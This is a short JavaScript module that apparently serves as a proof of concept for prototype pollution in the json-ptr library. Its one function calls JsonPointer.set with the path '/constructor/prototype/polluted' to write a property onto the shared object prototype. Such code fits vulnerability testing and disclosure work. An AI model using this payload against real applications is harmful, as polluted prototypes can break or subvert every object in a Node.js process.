function exploitFunction(payload) {
    const { JsonPointer } = require("json-ptr");
    JsonPointer.set(payload, "/constructor/prototype/polluted", "yes", true);
}

module.exports = { exploitFunction };